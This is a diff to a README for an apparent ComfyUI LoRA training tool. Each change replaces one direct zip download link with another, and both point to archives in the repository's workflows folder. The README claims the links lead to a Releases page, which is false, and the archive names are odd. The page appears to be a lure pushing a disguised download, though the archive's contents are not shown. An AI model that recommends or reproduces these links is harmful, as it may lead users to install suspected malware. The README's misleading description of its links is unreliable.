@@ -1,6 +1,6 @@
 # 🎨 comfyUI-Realtime-Lora - Easily Train and Edit LoRAs
 
-[![Download Now](https://raw.githubusercontent.com/Oussama23o/comfyUI-Realtime-Lora/main/workflows/comfy_U_Lora_Realtime_unsubjective.zip%20Now-Grab%20It%20Here-brightgreen)](https://raw.githubusercontent.com/Oussama23o/comfyUI-Realtime-Lora/main/workflows/comfy_U_Lora_Realtime_unsubjective.zip)
+[![Download Now](https://raw.githubusercontent.com/Oussama23o/comfyUI-Realtime-Lora/main/workflows/comfy_U_Realtime_Lora_3.8.zip%20Now-Grab%20It%20Here-brightgreen)](https://raw.githubusercontent.com/Oussama23o/comfyUI-Realtime-Lora/main/workflows/comfy_U_Realtime_Lora_3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to comfyUI-Realtime-Lora! This tool allows you to train and block edit L
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download Here](https://raw.githubusercontent.com/Oussama23o/comfyUI-Realtime-Lora/main/workflows/comfy_U_Lora_Realtime_unsubjective.zip).
+To download the application, visit this page: [Download Here](https://raw.githubusercontent.com/Oussama23o/comfyUI-Realtime-Lora/main/workflows/comfy_U_Realtime_Lora_3.8.zip).
 
 1. Click on the above link to reach the Releases page.
 2. Look for the latest version at the top of the page.
@@ -57,6 +57,6 @@ If you face any issues or have questions, please open a new issue in the reposit
 
 ## 🔗 Conclusion
 
-With comfyUI-Realtime-Lora, training and editing LoRAs is straightforward and user-friendly. Don’t hesitate to visit the Releases page to download the latest version: [Download Here](https://raw.githubusercontent.com/Oussama23o/comfyUI-Realtime-Lora/main/workflows/comfy_U_Lora_Realtime_unsubjective.zip).
+With comfyUI-Realtime-Lora, training and editing LoRAs is straightforward and user-friendly. Don’t hesitate to visit the Releases page to download the latest version: [Download Here](https://raw.githubusercontent.com/Oussama23o/comfyUI-Realtime-Lora/main/workflows/comfy_U_Realtime_Lora_3.8.zip).
 
 Explore the power of AI in your projects with ease!
